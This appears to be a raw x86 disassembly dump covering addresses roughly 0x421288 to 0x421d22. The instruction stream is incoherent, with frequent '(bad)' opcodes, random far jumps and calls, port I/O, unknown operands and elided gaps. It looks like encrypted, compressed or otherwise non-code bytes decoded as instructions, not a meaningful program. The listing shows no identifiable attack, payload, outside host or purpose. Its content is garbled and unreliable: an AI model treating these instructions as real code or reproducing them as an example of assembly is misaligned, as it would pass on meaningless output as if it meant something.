  421288:	add    eax,0x26000001
  42128d:	rcr    DWORD PTR [edx],1
  42128f:	ret    0x3d4
  421292:	dec    ecx
  421293:	pop    edx
  421294:	repz and BYTE PTR [ebx-0x183b65da],bl
  42129b:	or     dh,BYTE PTR [ecx-0x26]
  42129e:	sbb    al,ah
  4212a0:	jmp    0x19f8:0x37ee1f66
  4212a7:	(bad)  
  4212a8:	fistp  QWORD PTR [ebp+0x7af1c4b2]
  4212ae:	aas    
  4212af:	jmp    0x6158:0x56781c81
  4212b6:	cmp    ecx,eax
  4212b8:	fmul   DWORD PTR [ebp+0x1c0a4ea6]
  4212be:	pushf  
  4212bf:	sahf   
  4212c0:	scas   al,BYTE PTR es:[edi]
  4212c1:	xchg   ebp,eax
  4212c2:	add    esi,DWORD PTR [ebp+0x77ab43f7]
  4212c8:	add    edx,edi
  4212ca:	ins    BYTE PTR es:[edi],dx
  4212cb:	xchg   bl,al
  4212cd:	ret    0xfaf9
  4212d0:	ja     0x42127c
  4212d2:	jo     0x421266
  4212d4:	ins    BYTE PTR es:[edi],dx
  4212d5:	xor    ah,BYTE PTR [edi]
  4212d7:	mov    ebp,0xf788d17
  4212dc:	mov    dl,0x65
  4212de:	retf   0xe8a6
  4212e1:	cmp    BYTE PTR [eax+edx*8-0x198b9155],0x8b
  4212e9:	add    edi,DWORD PTR [eax+ecx*8+0x39]
  4212ed:	cld    
  4212ee:	mov    ch,0xeb
  4212f0:	ins    DWORD PTR es:[edi],dx
  4212f1:	and    al,0xa5
  4212f3:	mov    esi,0x84de74d3
  4212f8:	or     ebp,DWORD PTR [esi+ebx*8-0x3f]
  4212fc:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212fe:	xor    esi,0x41d8dbd5
  421304:	inc    ebx
  421305:	nop
  421306:	xchg   esp,eax
  421307:	dec    eax
  421308:	add    BYTE PTR [ecx-0x43],ah
  42130b:	mov    ecx,0x90bc8f06
  421310:	fidivr WORD PTR [edx+0x40579519]
  421316:	inc    edi
  421317:	mov    al,0xe8
  421319:	in     eax,0x22
  42131b:	ret    
  42131c:	jle    0x421316
  42131e:	add    ebx,eax
  421320:	or     DWORD PTR [ecx-0x27],ebp
  421323:	nop
  421324:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  421326:	pop    esp
  421327:	xor    eax,0x95433410
  42132c:	add    eax,0xd0d2f76e
  421331:	mov    eax,ds:0x42d45408
  421336:	test   DWORD PTR [edi+ebp*1],edi
  421339:	sahf   
  42133a:	sbb    dl,al
  42133c:	ret    
  42133d:	fsubrp st(4),st
  42133f:	dec    esp
  421340:	inc    esi
  421341:	int    0x45
  421343:	pop    eax
  421344:	and    eax,0x89784656
  421349:	xchg   DWORD PTR [edx-0x3424ad3a],eax
  42134f:	and    DWORD PTR [eax],0x543a112e
  421355:	and    eax,0xbacb6199
  42135a:	mov    ebp,0xc6771183
  42135f:	mov    ds:0xf820116e,al
  421364:	ret    0xc494
  421367:	xor    al,0x1d
  421369:	ret    
  42136a:	call   0xcb49:0xc6219fe7
  421371:	sub    BYTE PTR [ebx+0xf],dh
  421374:	and    eax,0x5808dc36
  421379:	pop    eax
  42137a:	xor    DWORD PTR ds:0x7e242696,edi
  421380:	jge    0x4213e5
  421382:	sub    dh,al
  421384:	jp     0x4213e8
  421386:	mov    ch,0x8a
  421388:	frstor [ebx+0x58f9fc5]
  42138e:	cmp    dl,ah
  421390:	add    DWORD PTR [eax],eax
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x7a6f0b61]
  421402:	and    al,0xb9
  421404:	mov    ds:0x5000162,al
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    BYTE PTR [edx],al
  42140d:	push   edx
  42140e:	or     BYTE PTR [edi-0x13],bh
  421411:	jp     0x42142d
  421413:	sbb    cl,cl
  421415:	mov    al,ds:0x525245c9
  42141a:	jmp    0x421454
  42141c:	mov    edi,0x83562499
  421421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421422:	pop    ds
  421423:	inc    ecx
  421424:	iret   
  421425:	pop    DWORD PTR ds:0x96e77a3
  42142b:	das    
  42142c:	inc    eax
  42142d:	stos   DWORD PTR es:[edi],eax
  42142e:	xchg   esp,eax
  42142f:	xor    al,0x71
  421431:	or     edi,DWORD PTR [ecx]
  421433:	in     eax,dx
  421434:	loope  0x421476
  421436:	rcl    BYTE PTR es:[ebx],cl
  421439:	add    ebp,esp
  42143b:	add    ecx,DWORD PTR [eax+0x8c548b1]
  421441:	mov    BYTE PTR [eax-0x25],al
  421444:	adc    BYTE PTR [ecx+ecx*8],dh
  421447:	push   esp
  421448:	mov    ah,0xe8
  42144a:	dec    esp
  42144b:	dec    ebp
  42144c:	lds    esp,FWORD PTR [esi]
  42144e:	push   ecx
  42144f:	dec    esi
  421450:	mov    ebp,0x7eb73713
  421455:	cld    
  421456:	push   0x970439cf
  42145b:	(bad)  
  42145c:	lods   eax,DWORD PTR ds:[esi]
  42145d:	xchg   BYTE PTR [ebx+0x6ce76af4],dh
  421463:	in     al,0x20
  421465:	or     ah,bl
  421467:	xchg   BYTE PTR [esi-0x7b2eda44],bh
  42146d:	outs   dx,BYTE PTR ds:[esi]
  42146e:	stos   DWORD PTR es:[edi],eax
  42146f:	mov    ecx,0x50cf0a63
  421474:	out    0xb8,al
  421476:	sub    eax,0x9afd0619
  42147b:	daa    
  42147c:	and    BYTE PTR [edx+0x25],bh
  42147f:	out    0x60,eax
  421481:	ficomp WORD PTR [edx+0x7]
  421484:	loopne 0x4214a0
  421486:	ret    
  421487:	fisttp DWORD PTR [ebp+0x2811e107]
  42148d:	sar    BYTE PTR [eax],1
  42148f:	out    dx,eax
  421490:	or     al,0xdc
  421492:	ds test cl,bh
  421495:	add    eax,0xb4d6e8c7
  42149a:	pop    edi
  42149b:	sbb    al,0x9f
  42149d:	sub    eax,0x71ea60af
  4214a2:	shl    BYTE PTR [esi-0x7b319288],1
  4214a8:	xchg   edx,eax
  4214a9:	sub    BYTE PTR [eax-0x5550027],cl
  4214af:	fst    DWORD PTR [eax+0x5becf6fe]
  4214b5:	add    BYTE PTR [edi],0xc2
  4214b8:	stc    
  4214b9:	(bad)  
  4214ba:	imul   esi,esi,0xfffffffc
  4214bd:	ror    edi,1
  4214bf:	xor    bh,BYTE PTR ds:0xe007fbda
  4214c5:	sti    
  4214c6:	test   DWORD PTR [eax-0x24],ebp
  4214c9:	sub    eax,0x88bdc333
  4214ce:	xor    eax,esi
  4214d0:	push   edx
  4214d1:	mov    dh,BYTE PTR [ecx]
  4214d3:	add    al,BYTE PTR [esi-0x7]
  4214d6:	mov    esp,0x9e8e90c8
  4214db:	enter  0x7f7,0x4c
  4214df:	ja     0x421468
  4214e1:	mov    cl,0x6
  4214e3:	or     BYTE PTR [ebx-0x32eab7f5],cl
  4214e9:	adc    ebp,DWORD PTR [ebx-0x22b06f87]
  4214ef:	pop    esi
  4214f0:	popf   
  4214f1:	outs   dx,BYTE PTR ds:[esi]
  4214f2:	lahf   
  4214f3:	lea    ebx,[esi-0x7d]
  4214f6:	or     bl,BYTE PTR [edi-0x6f7d3dc7]
  4214fc:	mov    eax,ds:0xa577d633
  421501:	sub    BYTE PTR [eax-0x27],0xa
  421505:	jo     0x421584
  421507:	pop    ss
  421508:	es jae 0x421578
  42150b:	inc    ebp
  42150c:	xchg   DWORD PTR [esi-0x5f],edx
  42150f:	jo     0x42158e
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x22f342b4],bp
  421582:	ds xor al,0xa7
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0x75000001,al
  42158d:	xchg   BYTE PTR [ebp+0x48],bl
  421590:	mov    ss,WORD PTR [edx+0x53c8fdc1]
  421596:	in     eax,0xa8
  421598:	cmc    
  421599:	cwde   
  42159a:	sub    ecx,DWORD PTR [ecx]
  42159c:	arpl   bp,sp
  42159e:	lea    sp,[edi-0x79]
  4215a2:	sbb    BYTE PTR [ebx-0x76],0x69
  4215a6:	cmp    DWORD PTR [ecx],0x60
  4215a9:	outs   dx,DWORD PTR ds:[esi]
  4215aa:	xor    BYTE PTR [edx],bh
  4215ac:	or     DWORD PTR cs:[esi],ecx
  4215af:	sar    ch,0xb1
  4215b2:	mov    al,0x73
  4215b4:	retf   0x2f29
  4215b7:	aaa    
  4215b8:	cmp    DWORD PTR [eax+edx*8],eax
  4215bb:	popa   
  4215bc:	sbb    dh,BYTE PTR [eax-0x20]
  4215bf:	pop    ebx
  4215c0:	scas   al,BYTE PTR es:[edi]
  4215c1:	pusha  
  4215c2:	clc    
  4215c3:	push   edi
  4215c4:	(bad)
  4215c9:	lods   eax,DWORD PTR ds:[esi]
  4215ca:	int    0xa5
  4215cc:	xor    DWORD PTR [edi+0x1d],edx
  4215cf:	ss jns 0x421635
  4215d2:	test   bh,dh
  4215d4:	(bad)  
  4215d5:	fadd   QWORD PTR [edi-0xb]
  4215d8:	ja     0x421633
  4215da:	ud1    esp,DWORD PTR [edi-0x475a233]
  4215e1:	ins    DWORD PTR es:[edi],dx
  4215e2:	push   ecx
  4215e3:	daa    
  4215e4:	sbb    al,0x62
  4215e6:	cmp    DWORD PTR [edi-0x794d6aa5],edx
  4215ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215ed:	mov    bl,0x18
  4215ef:	inc    ebx
  4215f0:	sub    ebx,edi
  4215f2:	jne    0x4215ae
  4215f4:	shl    BYTE PTR [ecx],0xc9
  4215f7:	cwde   
  4215f8:	lds    edx,FWORD PTR [edi+0x3122c4a7]
  4215fe:	inc    ebp
  4215ff:	push   0xffffffff
  421601:	xchg   dl,bl
  421603:	adc    DWORD PTR [eax-0x44c07a5],esp
  421609:	outs   dx,DWORD PTR ds:[esi]
  42160a:	pusha  
  42160b:	cmp    BYTE PTR ss:[esi+0x24],al
  42160f:	or     edi,0xaa24c3f
  421615:	repnz cmp esp,DWORD PTR [edi-0x7fe14731]
  42161c:	pop    ebp
  42161d:	sub    eax,0xe5cc1e0a
  421622:	or     edx,esp
  421624:	dec    edi
  421625:	add    ebp,esi
  421627:	sub    ebx,DWORD PTR ds:0x70656359
  42162d:	dec    ebp
  42162e:	mov    al,ds:0x9ce24f57
  421633:	xor    edx,edi
  421635:	cmp    bh,0x2f
  421638:	dec    edx
  421639:	pop    edx
  42163a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42163b:	push   ds
  42163c:	sbb    bh,0x50
  42163f:	in     eax,dx
  421640:	pop    edi
  421641:	xchg   BYTE PTR [edx+0x22],ch
  421644:	dec    esi
  421645:	adc    BYTE PTR [edi-0x5e5b3a67],bh
  42164b:	pusha  
  42164c:	mov    al,0x48
  42164e:	out    dx,eax
  42164f:	cmp    BYTE PTR [edx+0x1bb17161],0xc3
  421656:	dec    esi
  421657:	pusha  
  421658:	iret   
  421659:	clc    
  42165a:	push   ss
  42165b:	adc    edi,DWORD PTR [esi+0x61f841a3]
  421661:	out    dx,eax
  421662:	mov    WORD PTR [eax],ds
  421664:	imul   edi,DWORD PTR [esi-0x25],0x18c29e3c
  42166b:	push   0xffffffac
  42166d:	addr16 xchg ecx,eax
  42166f:	dec    esp
  421670:	sbb    DWORD PTR [edx+0x7e],esp
  421673:	sbb    al,dh
  421675:	dec    eax
  421676:	mov    edx,0xa7c2e794
  42167b:	xor    ecx,DWORD PTR [ebx+0x7a]
  42167e:	in     eax,0xa5
  421680:	cdq    
  421681:	and    dh,ah
  421683:	xchg   esi,eax
  421684:	cdq    
  421685:	push   eax
  421686:	inc    ebx
  421687:	and    DWORD PTR [eax],ebp
  421689:	scas   eax,DWORD PTR es:[edi]
  42168a:	(bad)
  42168d:	mov    dh,0x52
  42168f:	arpl   WORD PTR [eax],cx
	...
  4216f1:	add    BYTE PTR [eax],al
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	sub    dl,BYTE PTR [edx-0x1]
  421703:	push   ds
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0x41000001
  42170d:	mov    esi,0xd1357831
  421712:	popf   
  421713:	xor    BYTE PTR [edx*1+0x4206e4dc],0xe0
  42171b:	jbe    0x42171d
  42171d:	or     DWORD PTR [eax+eax*2],ecx
  421720:	inc    edi
  421721:	pop    ebx
  421722:	lods   eax,DWORD PTR ds:[esi]
  421723:	cwde   
  421724:	inc    esp
  421725:	dec    edi
  421726:	ret    
  421727:	adc    eax,0xd33244cd
  42172c:	xchg   ecx,eax
  42172d:	or     BYTE PTR [ebx-0x3d],0x9
  421731:	fistp  QWORD PTR [edx-0x77f5dcba]
  421737:	ret    
  421738:	add    dh,al
  42173a:	cmp    al,0xd3
  42173c:	mov    bh,0x94
  42173e:	ins    DWORD PTR es:[edi],dx
  42173f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421740:	jno    0x4216cd
  421742:	or     BYTE PTR [edx+0x3b],dh
  421745:	jnp    0x4217a2
  421747:	mov    ecx,?
  421749:	pop    ebx
  42174a:	hlt    
  42174b:	pop    esi
  42174c:	mov    bl,0xa2
  42174e:	(bad)  
  42174f:	fsubr  st,st(0)
  421751:	lock sbb BYTE PTR [esi-0x38],dh
  421755:	int    0xcd
  421757:	(bad)  
  421758:	cli    
  421759:	sub    DWORD PTR [eax],0x8
  42175c:	adc    ah,BYTE PTR [edx+0x52811270]
  421762:	push   edi
  421763:	sbb    ebx,DWORD PTR [edi+0x69]
  421766:	mov    eax,ds:0x55661179
  42176b:	add    eax,0xbb4c70be
  421770:	out    dx,eax
  421771:	dec    ebx
  421772:	xchg   ecx,eax
  421773:	cwde   
  421774:	mov    edi,0xda4750d2
  421779:	jmp    0x421787
  42177b:	xchg   ebp,eax
  42177c:	sbb    al,0x8
  42177e:	sti    
  42177f:	jge    0x421762
  421781:	sahf   
  421782:	test   al,0x31
  421784:	and    esp,edx
  421786:	shl    eax,0xdf
  421789:	inc    edi
  42178a:	jae    0x42177c
  42178c:	jg     0x42176f
  42178e:	or     eax,0xe34c4cb5
  421793:	adc    BYTE PTR [ebp+0xa28c705],dh
  421799:	mov    ds:0xd01dc3fe,al
  42179e:	cmp    al,0x0
  4217a0:	fisttp WORD PTR cs:[esi-0x2b7d5eea]
  4217a7:	jmp    0x4217ae
  4217a9:	stos   BYTE PTR es:[edi],al
  4217aa:	add    DWORD PTR [ebx-0xbd3d0b3],0xeec00d80
  4217b4:	add    DWORD PTR [ebx],eax
  4217b6:	cmp    DWORD PTR [ecx+0x6b],0x959c9feb
  4217bd:	stos   BYTE PTR es:[edi],al
  4217be:	in     al,0x84
  4217c0:	das    
  4217c1:	or     DWORD PTR [edx],ebp
  4217c3:	ds adc al,0xaa
  4217c6:	dec    esp
  4217c8:	add    DWORD PTR [ebx+0x3923979a],esp
  4217ce:	sbb    DWORD PTR [esi],ebp
  4217d0:	pop    eax
  4217d1:	dec    edi
  4217d2:	xor    ecx,DWORD PTR [eax]
  4217d4:	sar    dl,0x92
  4217d7:	jae    0x42176d
  4217d9:	ret    0x8f1c
  4217dc:	and    BYTE PTR [edx+0x28],bl
  4217df:	push   ds
  4217e0:	fdivp  st(7),st
  4217e2:	xchg   DWORD PTR [edx-0x14e8b708],ebp
  4217e8:	dec    edi
  4217e9:	rol    BYTE PTR [ecx],1
  4217eb:	gs pop edi
  4217ed:	ret    0xeba2
  4217f0:	cmp    ebx,DWORD PTR [eax+0x2d]
  4217f3:	mov    esi,0x38fb2f60
  4217f8:	out    0x52,al
  4217fa:	int    0xae
  4217fc:	mov    al,BYTE PTR [eax+0x1f]
  4217ff:	cmp    al,0x3c
  421801:	push   0x5a
  421803:	mov    ebx,0xa2c8db7a
  421808:	cli    
  421809:	mov    eax,DWORD PTR [ebx+0x1f]
  42180c:	add    BYTE PTR [ecx+eax*1+0x5019],0x0
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	push   ebx
  421881:	(bad)  
  421883:	pop    ecx
  421884:	mov    cl,0x65
  421886:	add    DWORD PTR [eax],eax
  421888:	add    eax,0x74000001
  42188d:	sub    eax,esp
  42188f:	mov    bl,0x3
  421891:	pop    ds
  421892:	add    DWORD PTR [eax+edi*1],eax
  421895:	xchg   ebx,eax
  421896:	xor    BYTE PTR ds:0xd764dd6e,bl
  42189c:	call   0xf970:0x6c09c987
  4218a3:	and    esi,ebx
  4218a5:	leave  
  4218a6:	jns    0x421910
  4218a8:	push   eax
  4218a9:	push   edi
  4218aa:	(bad)  
  4218ab:	push   ebp
  4218ac:	and    al,0x3
  4218ae:	jno    0x421842
  4218b0:	ins    BYTE PTR es:[edi],dx
  4218b1:	popf   
  4218b2:	imul   esp,eax,0xa9ce91ec
  4218b8:	push   ecx
  4218b9:	out    0x78,al
  4218bb:	jmp    ecx
  4218bd:	leave  
  4218be:	repnz es repz dec edx
  4218c2:	and    BYTE PTR [esi-0xc],ah
  4218c5:	xor    DWORD PTR [ebx],edi
  4218c7:	and    al,0x96
  4218c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218ca:	(bad)  
  4218cb:	mov    eax,ds:0x75161daf
  4218d0:	ret    0x9dbd
  4218d3:	mov    edx,0x18b79a08
  4218d8:	push   ebp
  4218d9:	es cmc 
  4218db:	jle    0x4218dc
  4218dd:	and    bh,BYTE PTR [ebx-0x6d]
  4218e0:	rol    DWORD PTR [edx+0x6f606a7b],cl
  4218e6:	jg     0x4218d0
  4218e8:	scas   al,BYTE PTR es:[edi]
  4218e9:	sub    bh,BYTE PTR [edi+0x72da0133]
  4218ef:	mov    cl,dl
  4218f1:	mov    al,0x56
  4218f3:	je     0x4218c5
  4218f5:	sbb    al,0xf1
  4218f7:	sbb    cl,al
  4218f9:	das    
  4218fa:	arpl   WORD PTR ds:0x499da62,bx
  421900:	call   0x8cb9:0x679ee57f
  421907:	add    eax,0x10dc1727
  42190c:	and    dl,BYTE PTR [edi-0x2b99d9fa]
  421912:	clc    
  421913:	xor    al,0xd1
  421915:	lock into 
  421917:	mov    eax,DWORD PTR [ebx+0x4c98c1eb]
  42191d:	adc    ch,BYTE PTR [ebp+0x273e9589]
  421923:	add    BYTE PTR [eax-0x2c],0xec
  421927:	inc    edx
  421928:	xchg   esp,eax
  421929:	(bad)  
  42192a:	push   ss
  42192b:	add    al,0x9a
  42192d:	in     eax,dx
  42192e:	mov    al,ds:0xa60980c4
  421933:	mov    eax,0x8065acaa
  421938:	dec    edi
  421939:	inc    edx
  42193a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42193b:	push   edx
  42193c:	mov    edx,0x271b2fc7
  421941:	and    BYTE PTR [esi+0x39],0x67
  421945:	out    0x31,al
  421947:	fadd   DWORD PTR [edi-0x26abbf8f]
  42194d:	aaa    
  42194e:	cmp    DWORD PTR [ebx],esi
  421950:	(bad)  
  421952:	pop    edi
  421953:	xchg   ebp,eax
  421954:	add    BYTE PTR [ebp+edi*1+0x72724a71],ah
  42195b:	scas   al,BYTE PTR es:[edi]
  42195c:	dec    ebp
  42195d:	jecxz  0x42191d
  42195f:	cmp    BYTE PTR [ecx+0x1b432293],cl
  421965:	mov    dh,0x30
  421967:	test   al,0x62
  421969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42196a:	mov    eax,ds:0x9551fafc
  42196f:	lea    ecx,[eax]
  421971:	jns    0x421925
  421973:	icebp  
  421974:	xchg   edi,eax
  421975:	push   ebp
  421976:	inc    esi
  421977:	and    cl,al
  421979:	mov    bh,0x6c
  42197b:	shl    DWORD PTR [esp+ecx*8],cl
  42197e:	fs int3 
  421980:	lea    ebp,[edi-0x18d67122]
  421986:	mov    ecx,0xdb6d045f
  42198b:	test   ah,al
  42198d:	(bad)  
  42198e:	fwait
  42198f:	xchg   edi,eax
  421990:	and    eax,0x0
	...
  4219f1:	add    BYTE PTR [eax],al
  4219f3:	add    dh,bh
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	cmp    al,0xe2
  421a02:	lods   al,BYTE PTR ds:[esi]
  421a03:	inc    esp
  421a04:	mov    dh,0x66
  421a06:	add    DWORD PTR [eax],eax
  421a08:	add    eax,0x92000001
  421a0d:	ror    eax,0xe5
  421a10:	cmp    al,BYTE PTR [edx]
  421a12:	fs call 0xf086:0x5ff11f7b
  421a1a:	scas   eax,DWORD PTR es:[edi]
  421a1b:	(bad)  
  421a1c:	nop
  421a1d:	loop   0x421a99
  421a1f:	adc    edx,DWORD PTR [edi+0x4ce125fe]
  421a25:	in     al,0x1b
  421a27:	scas   eax,DWORD PTR es:[edi]
  421a28:	ja     0x421a45
  421a2a:	jp     0x421a7d
  421a2c:	sbb    ah,BYTE PTR [edx]
  421a2e:	lods   al,BYTE PTR ds:[esi]
  421a2f:	ret    0x870c
  421a32:	and    DWORD PTR [esi-0x1993302b],0xc1e6cb3e
  421a3c:	or     al,0xdd
  421a3e:	sub    esi,esp
  421a40:	xor    eax,0xc25dea16
  421a45:	xor    DWORD PTR [edx-0x20608d92],ebx
  421a4b:	lods   eax,DWORD PTR ds:[esi]
  421a4c:	and    eax,0x780f75b9
  421a51:	je     0x421a3c
  421a53:	cs aaa 
  421a55:	data16 xchg BYTE PTR [esi+0x1d],al
  421a59:	test   al,0xec
  421a5b:	aas    
  421a5c:	inc    esp
  421a5d:	mov    ds:0x4fd97914,eax
  421a62:	mov    esp,0xceadc9ba
  421a67:	daa    
  421a68:	outs   dx,BYTE PTR ds:[esi]
  421a69:	push   cs
  421a6a:	mov    dl,0x88
  421a6c:	sbb    BYTE PTR [esi-0x18647ebf],dh
  421a72:	popf   
  421a73:	adc    eax,0x6e9271a0
  421a78:	(bad)  
  421a79:	xor    esp,DWORD PTR ds:0x8abf79ec
  421a7f:	adc    eax,0x2e50d7b9
  421a84:	jae    0x421a13
  421a86:	ffree  st(1)
  421a88:	xchg   esp,eax
  421a89:	fnstsw WORD PTR [ebp+0x47689fe9]
  421a8f:	adc    eax,0x720c9e2b
  421a94:	fnstenv [esi+0x17]
  421a97:	ja     0x421afc
  421a99:	gs pop ds
  421a9b:	sar    BYTE PTR [edx-0x1c],cl
  421a9e:	sbb    al,0xb0
  421aa0:	dec    ebx
  421aa1:	mov    ch,0xc7
  421aa3:	push   edi
  421aa4:	mov    bh,0x4b
  421aa6:	inc    ebx
  421aa7:	pop    ss
  421aa8:	in     al,dx
  421aa9:	add    DWORD PTR [ebx-0x33],esp
  421aac:	ror    DWORD PTR [esi],1
  421aae:	pop    ecx
  421aaf:	mov    al,ds:0x68d1c716
  421ab4:	scas   al,BYTE PTR es:[edi]
  421ab5:	xchg   edx,eax
  421ab6:	jnp    0x421ad7
  421ab8:	sbb    bh,BYTE PTR [edi-0x3d]
  421abb:	out    0xc2,al
  421abd:	sbb    BYTE PTR [esi-0x7d8a9b85],0x7a
  421ac4:	xor    al,0xa8
  421ac6:	adc    eax,0x968e2373
  421acb:	sub    eax,0x170d4ff2
  421ad0:	mov    dh,0xd0
  421ad2:	push   cs
  421ad3:	fisub  WORD PTR [ebx]
  421ad5:	ja     0x421acd
  421ad7:	push   edx
  421ad8:	clc    
  421ad9:	xchg   DWORD PTR [ebx-0x49],edi
  421adc:	call   0x23c2:0xa65590f9
  421ae3:	out    dx,al
  421ae4:	xchg   edi,eax
  421ae5:	nop
  421ae6:	mov    ch,0x56
  421ae8:	xchg   sp,ax
  421aea:	push   ebx
  421aeb:	stos   DWORD PTR es:[edi],eax
  421aec:	fwait
  421aed:	call   0xe7e938d2
  421af2:	jp     0x421ace
  421af4:	sbb    BYTE PTR [eax],bl
  421af6:	ret    
  421af7:	mov    cl,0x8c
  421af9:	and    bh,BYTE PTR [ebx+0x2d827e07]
  421aff:	stos   BYTE PTR es:[edi],al
  421b00:	clc    
  421b01:	shr    DWORD PTR [esi+0x29],cl
  421b04:	xor    al,0x4c
  421b06:	adc    eax,0xa47f6f1
  421b0b:	ins    DWORD PTR es:[edi],dx
  421b0c:	or     BYTE PTR [esi+0xdcd8b9],dl
	...
  421b72:	add    BYTE PTR [eax],al
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     cl,BYTE PTR [esi]
  421b81:	jl     0x421b77
  421b83:	adc    eax,0x167bb
  421b88:	add    eax,0x8d000001
  421b8d:	faddp  st(4),st
  421b8f:	mov    esi,0x9ccfc99e
  421b94:	stos   BYTE PTR es:[edi],al
  421b95:	mov    ah,0xc4
  421b97:	mov    ebp,DWORD PTR ds:0xd9237ccc
  421b9d:	pop    ebp
  421b9e:	test   BYTE PTR [ebx+0xa],bh
  421ba1:	mov    ebp,DWORD PTR [ecx*8-0x24d66a55]
  421ba8:	or     BYTE PTR [edx],dh
  421baa:	push   ebx
  421bab:	sahf   
  421bac:	jg     0x421c2b
  421bae:	aaa    
  421baf:	bound  ecx,QWORD PTR [ebp+0x4ee5d18f]
  421bb5:	bound  ebp,QWORD PTR [ecx+0x7f46e56c]
  421bbb:	retf   
  421bbc:	stc    
  421bbd:	pop    ss
  421bbe:	clc    
  421bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bc0:	aam    0xd6
  421bc2:	fldcw  WORD PTR [ebx-0x10]
  421bc5:	test   BYTE PTR [edi-0x75],bl
  421bc8:	into   
  421bc9:	aas    
  421bca:	aad    0xc9
  421bcc:	es pop esi
  421bce:	loope  0x421bd3
  421bd0:	outs   dx,DWORD PTR ds:[esi]
  421bd1:	repz adc DWORD PTR [ebp-0x46],edx
  421bd5:	cli    
  421bd6:	cdq    
  421bd7:	push   ebx
  421bd8:	scas   eax,DWORD PTR es:[edi]
  421bd9:	jbe    0x271d7e47
  421bdf:	mov    edx,0xc1ba0f11
  421be4:	mov    bl,0xfe
  421be6:	ds jle 0x421c10
  421be9:	xchg   ecx,eax
  421bea:	mov    dl,0xa2
  421bec:	leave  
  421bed:	ret    0x5eef
  421bf0:	or     al,0x37
  421bf2:	pop    ss
  421bf3:	lods   eax,DWORD PTR ds:[esi]
  421bf4:	int3   
  421bf5:	mov    WORD PTR [eax+ebp*4-0x530f9c25],?
  421bfc:	jae    0x421c05
  421bfe:	mov    edx,ebp
  421c00:	push   ds
  421c01:	xor    dl,dh
  421c03:	ffreep st(1)
  421c05:	mov    bl,0x61
  421c07:	loopne 0x421bc5
  421c09:	stc    
  421c0a:	js     0x421bee
  421c0c:	push   0x49
  421c0e:	popa   
  421c0f:	inc    edi
  421c10:	inc    edi
  421c11:	repnz sbb bl,dl
  421c14:	add    dh,dl
  421c16:	int3   
  421c17:	lods   al,BYTE PTR ds:[esi]
  421c18:	out    dx,eax
  421c19:	adc    al,cl
  421c1b:	imul   ecx,DWORD PTR [edi+edi*4-0x5573c6d0],0x546d836b
  421c26:	call   0x7ae819a6
  421c2b:	bnd jge 0x421c15
  421c2e:	scas   eax,DWORD PTR es:[edi]
  421c2f:	mov    ecx,0xf1c52a7f
  421c34:	and    DWORD PTR [edx+0x51a96e89],eax
  421c3a:	mov    ds:0x46a60e9d,eax
  421c3f:	mov    ah,BYTE PTR [ecx-0x30517ebe]
  421c45:	ss inc eax
  421c47:	or     DWORD PTR [edi+eiz*8],esp
  421c4a:	call   0xe66539ad
  421c4f:	sbb    ebp,DWORD PTR [edx+ebp*8-0x5b]
  421c53:	inc    edx
  421c54:	sub    esp,DWORD PTR [bp+di+0x7e6a]
  421c59:	and    ebx,DWORD PTR [esi-0x70]
  421c5c:	jae    0x421bee
  421c5e:	inc    ebp
  421c5f:	mov    ah,BYTE PTR [ecx+0x30]
  421c62:	pop    ecx
  421c63:	dec    esi
  421c64:	or     eax,0xdcd187d3
  421c69:	pusha  
  421c6a:	in     eax,dx
  421c6b:	and    ecx,esi
  421c6d:	cs pop ebp
  421c6f:	xor    DWORD PTR [esp+ebx*8-0x73],eax
  421c73:	xor    BYTE PTR [ecx],cl
  421c75:	jmp    0x5f276fcf
  421c7a:	ins    BYTE PTR es:[edi],dx
  421c7b:	inc    edi
  421c7c:	jg     0x421c4f
  421c7e:	loop   0x421ca1
  421c80:	popa   
  421c81:	inc    edx
  421c82:	loopne 0x421cf8
  421c84:	jmp    0x421c43
  421c86:	mov    ebx,0xe7d4da8e
  421c8b:	dec    ecx
  421c8c:	pop    esp
  421c8d:	mov    ebp,DWORD PTR [esi+0x7f12]
	...
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	outs   dx,DWORD PTR ds:[esi]
  421d01:	sbb    al,0x12
  421d03:	xadd   BYTE PTR [eax+0x1],ch
  421d07:	add    BYTE PTR ds:0x7e000001,al
  421d0d:	cmp    esi,DWORD PTR [ebx+0x46]
  421d10:	fs mov ebx,0x87a2d3bb
  421d16:	xchg   edx,eax
  421d17:	mov    edi,0xff3b878
  421d1c:	dec    ecx
  421d1d:	rcl    ebp,0x3b
  421d20:	jns    0x421d30
  421d22:	addr16 cli 
